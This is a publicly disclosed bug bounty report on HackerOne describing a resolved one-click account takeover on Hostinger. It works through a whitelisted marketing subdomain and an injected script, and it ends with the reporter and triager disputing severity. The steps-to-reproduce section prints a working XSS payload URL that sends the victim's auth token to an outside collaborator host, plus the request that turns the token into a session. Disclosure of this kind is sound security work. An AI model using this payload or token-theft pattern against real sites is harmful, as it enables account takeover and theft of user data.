---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-access-control-generic
  - env/web
substate: "resolved"
weakness: "Improper Access Control - Generic"
enriched: true
body: true
date: 2025-06-06
submitted: 2025-04-07T21:59:18.249Z
bounty_usd: null
votes: 219
cve: []
program: "[[programs/hostinger|hostinger ]]"
reporter: "aziz0x48"
source: "https://hackerone.com/reports/3081691"
title: "1 Click Account Takeover via Auth Token Theft on marketing.hostinger.com"
---
# 1 Click Account Takeover via Auth Token Theft on marketing.hostinger.com

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 219 | **Program:** hostinger  | **Disclosed:** 2025-06-06

- Report: [https://hackerone.com/reports/3081691](https://hackerone.com/reports/3081691)
- CWE: Improper Access Control - Generic
- Submitted: 2025-04-07T21:59:18.249Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
Hey Paul, hope you're doing good !

I discovered a One Click Account Takeover vulnerability in Hostinger through the ```marketing.hostinger.com``` subdomain. Since this subdomain is part of hostinger.com and is whitelisted for redirects, an attacker can exploit it to steal Hostinger users’ auth tokens and gain full access to their accounts with just a single click from the victims !

## Steps To Reproduce:

  -  Login in to the victim's account and visit the URL below, replace the attacker-url with your own burp collaborator url or your own dedicated server url:

```

https://auth.hostinger.com/login/?redirectUrl=https%3A%2F%2Fmarketing.hostinger.com%2Fen-us%2Fmarketplace_wix%2Fsite_not_published%3Fredirect_url%3Dx%22%3E%3C%2Fa%3E%3Cscript%3Efetch%28%27https%3A%2F%2Fwqqf8xerhgrhdk251cesqastbkhb54xsm.oastify.com%27%2C%20%7Bmethod%3A%20%27POST%27%2Cbody%3A%20window.location%7D%29%3C%2Fscript%3E

## Decoded URL:

https://auth.hostinger.com/login/?redirectUrl=https://marketing.hostinger.com/en-us/marketplace_wix/site_not_published?redirect_url=x"></a><script>fetch('wqqf8xerhgrhdk251cesqastbkhb54xsm.oastify.com',%20{method:%20'POST',body:%20window.location});</script>

```

  -  Check burp collaborator / server logs for the victim's account auth token :

{F4227740}

  -  The attacker can use the leaked auth token to generate a valid JWT for the victim's account and have complete control over the victim's account using the following request:

```
POST /hpanel/auth/auth-token HTTP/2
Host: builder-backend.hostinger.com
User-Agent: Mozilla/5.0 Gecko/20100101 Firefox/132.0
Origin: https://builder.hostinger.com
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Te: trailers
```

{F4227728}

██████

## Suggestion:
I believe that ```marketing.hostinger.com```  has been rebranded as ```rankingcoach.com```. Therefore, it would be best to either shut down the marketing subdomain or remove it from the whitelisted domains. This would be a quick and easy fix to mitigate the issue and enhance users security.

Thank you,
@aziz0x48

## Supporting Material/References:
Please refer to the attached screenshots and video.

## Impact

This vulnerability poses a significant risk to Hostinger users, as it allows attackers to bypass authentication and gain unauthorized access to accounts with just one click. By exploiting the ```marketing.hostinger.com``` subdomain, which is whitelisted for redirects, attackers can steal authentication tokens from users. Once the tokens are compromised, the attacker gains full access to the victim’s Hostinger account, including critical services such as hPanel, website builder, VPS servers, email, and personal data. This flaw puts all Hostinger users at risk of account takeover, data theft, and potential misuse of sensitive information, making it a serious security concern that requires immediate attention.

## Timeline

- **Report Filed**
- **Report Severity Updated**
- **Report Vulnerability Information Updated**
- **Report Vulnerability Information Updated**
- **Report Vulnerability Information Updated**
- **2025-04-07** @aziz0x48: ## Video POC:

████
- **2025-04-08** @pausmu: Hello, 

Thanks for participating in our program! We will review your report shortly and get back to you as soon as possible.

Regards,
@pausmu
- **Report Triaged**
- **Report Severity Updated**
- **2025-04-14** @pausmu: Hello @aziz0x48,

Thank you for your understanding as we addressed this case. Unfortunately, `marketing.hostinger.com` falls outside the scope of our HackerOne program policy. Additionally, this application is third-party and thus out of scope as well. Furthermore, the victim needs to be logged in when the link is accessed. For these reasons, we will adjust the attack complexity to `High`. 

Please let us know what you think so we can proceed with the bounty payment.

Regards,
@pausmu
- **2025-04-14** @aziz0x48: Hey @pausmu,

I completely understand that ```marketing.hostinger.com``` may be operated by a third party. However, from a security perspective, the impact is still there. It’s a subdomain of ```hostinger.com```, trusted by the main app, and  whitelisted in the redirect logic. This makes it a perfect bridge for leaking sensitive auth tokens. Regardless of its third-party nature, the main application and it's users are the ones affected.

As for the victim needing to be logged in, honestly, that’s the case for almost all 1-click ATOs. In our case, it’s even worse: if the victim isn’t logged in yet, the token will still be leaked after a successful login from the same link. So there’s no real barrier to the attack, and any attacker could pull this off easily.

Not gonna lie, a bit disappointed by the downgrade. This is a simple, impactful attack with serious possible consequences: full account takeover, token theft, stealthy API key generation for vicitm's account that leads to long-term access etc..

I hope you’ll reconsider the severity decision.

Thank you,
@aziz0x48
- **2025-04-15** @pausmu: Hello @aziz0x48,

Thank you for your response! Unfortunately, the main criterion in this case is that the attacker is not 100% sure of success, as successful exploitation depends on factors beyond the attacker's control (the victim must be logged in).  So, in this case, I think it covers pretty well that an attacker cannot execute a successful attack at will, as it also depends on other factors.

Imagine the same situation when taking over the account without the victim even needing to be logged in is possible. Should such scenarios be evaluated the same as the one when the victim must be logged in? Sadly, CVSS has its limits, and I'm sorry that we could not reach a mutual agreement.

We will proceed with the bounty payment now. Thanks for your reply and insights into this matter.

Regards,
@pausmu
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
